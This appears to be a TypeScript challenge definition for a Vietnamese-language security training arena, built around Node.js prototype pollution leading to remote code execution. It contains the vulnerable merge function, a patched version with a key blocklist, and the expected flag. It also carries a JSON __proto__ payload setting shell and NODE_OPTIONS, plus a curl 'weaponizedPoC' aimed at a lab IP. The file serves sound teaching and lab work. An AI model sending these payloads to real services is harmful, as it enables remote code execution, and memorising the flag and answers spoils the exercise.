import type { ArenaChallenge } from '../../types';

export const challengeProtoPollution: ArenaChallenge = {
  id: '0d-taint-01-proto-pollution',
  title: 'Node.js Object Prototype Pollution to Remote Code Execution',
  category: 'zero-day',
  severity: 'critical',
  cvssScore: 9.6,
  bountyReward: 4800,
  xpReward: 900,
  estimatedMinutes: 20,
  targetHost: '10.0.4.45',
  targetPort: 3000,
  tagline:
    'Khai thác hàm merge() đệ quy trong thư viện JSON parser để ghi đè Object.prototype và spawn shell.',
  scenarioBriefing:
    'Một microservice backend sử dụng hàm deepMerge tự viết không lọc key __proto__ hoặc constructor.prototype. Bằng cách gửi payload JSON chứa __proto__.shell, kẻ tấn công có thể làm ô nhiễm toàn bộ các object con của tiến trình Node.js và kích hoạt RCE khi hàm child_process.fork() được gọi.',
  keyObjectives: [
    'Phân tích mã nguồn hàm merge() trong Patch Diff Viewer để tìm lỗi thiếu điều kiện chặn __proto__.',
    'Gửi payload JSON qua HTTP Repeater để ô nhiễm Object.prototype.',
    'Kích hoạt tiến trình con và trích xuất Flag.',
  ],
  expectedFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
  firstBloodHolder: {
    handle: '@hex_master',
    timeRecord: '06m 40s',
  },
  supportedTools: ['diff', 'repeater'],
  defaultTool: 'diff',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v1/user/settings',
    defaultRawHeaders:
      'Host: 10.0.4.45:3000\n' +
      'Content-Type: application/json\n' +
      'Accept: application/json\n' +
      'Connection: close',
    defaultBody:
      '{"preferences": {"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/exploit.js"}, "shell": "/bin/sh"}}}',
    targetEndpoint: 'http://10.0.4.45:3000/api/v1/user/settings',
    simulatedResponses: {
      baseResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: {
          'Content-Type': 'application/json',
        },
        body: '{"status": "updated", "preferences": {}}',
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: {
          'Content-Type': 'application/json',
          'X-Pollution-Status': 'GLOBAL_PROTOTYPE_CORRUPTED',
        },
        body:
          '{\n' +
          '  "status": "POLLUTED",\n' +
          '  "message": "Object.prototype poisoned successfully",\n' +
          '  "spawn_output": "sh: root privileged context obtained",\n' +
          '  "flag": "OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}"\n' +
          '}',
        proofFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
      },
    },
  },
  diffConfig: {
    filename: 'object_utils.js',
    language: 'javascript',
    vulnerableLineStart: 6,
    vulnerableLineEnd: 11,
    rootCauseExplanation:
      'Hàm mergeObject đệ quy duyệt qua mọi thuộc tính từ JSON đầu vào và gán trực tiếp target[key] = source[key] mà không kiểm tra xem key có phải là __proto__, constructor hoặc prototype hay không.',
    taintSink:
      'target[key] = mergeObject(target[key], source[key]); // Prototype Pollution sink',
    vulnerableCode:
      '// vulnerable_merge.js\n' +
      'function mergeObject(target, source) {\n' +
      '    for (let key in source) {\n' +
      '        if (typeof source[key] === "object" && source[key] !== null) {\n' +
      '            if (!target[key]) target[key] = {};\n' +
      '            mergeObject(target[key], source[key]); // LỖ HỔNG: Gán thẳng __proto__!\n' +
      '        } else {\n' +
      '            target[key] = source[key];\n' +
      '        }\n' +
      '    }\n' +
      '    return target;\n' +
      '}',
    patchedCode:
      '// patched_merge.js (Safe Implementation)\n' +
      'const BLACKLISTED_KEYS = new Set(["__proto__", "constructor", "prototype"]);\n' +
      'function mergeObjectSafe(target, source) {\n' +
      '    for (let key in source) {\n' +
      '        // BẢN VÁ: Chặn triệt để các thuộc tính prototype đặc biệt\n' +
      '        if (BLACKLISTED_KEYS.has(key)) continue;\n' +
      '        if (Object.prototype.hasOwnProperty.call(source, key)) {\n' +
      '            if (typeof source[key] === "object" && source[key] !== null) {\n' +
      '                if (!target[key]) target[key] = {};\n' +
      '                mergeObjectSafe(target[key], source[key]);\n' +
      '            } else {\n' +
      '                target[key] = source[key];\n' +
      '            }\n' +
      '        }\n' +
      '    }\n' +
      '    return target;\n' +
      '}',
  },
  writeup: {
    title: 'Node.js Prototype Pollution to RCE Analysis',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    vulnerabilityOverview:
      'Prototype Pollution xảy ra khi kẻ tấn công có thể sửa đổi Object.prototype trong JavaScript runtime, khiến tất cả các object mới sinh ra đều kế thừa thuộc tính độc hại.',
    rootCauseAnalysis:
      'Các hàm merge đệ quy không validate thuộc tính đặc biệt __proto__. Khi kết hợp với các hàm hệ thống như child_process.spawn() (thường đọc options.shell từ object cấu hình), việc ô nhiễm shell: "/bin/sh" dẫn đến RCE.',
    exploitChainWalkthrough: [
      'Bước 1: Tìm endpoint nhận JSON body và thực hiện merge.',
      'Bước 2: Gửi JSON có key __proto__.',
      'Bước 3: Kiểm tra biến môi trường hoặc kích hoạt hành động gọi fork/spawn để nhận reverse shell.',
    ],
    weaponizedPoC:
      'curl -X POST http://10.0.4.45:3000/api/v1/user/settings \\\n  -H "Content-Type: application/json" \\\n  -d \'{"preferences":{"__proto__":{"shell":"/bin/sh","NODE_OPTIONS":"--require /tmp/poc.js"}}}\'',
    remediationSnippet:
      '// Sử dụng Object.create(null) để tạo object không có prototype:\nconst safeDict = Object.create(null);\n// Hoặc đóng băng prototype khi khởi động ứng dụng:\nObject.freeze(Object.prototype);',
  },
};
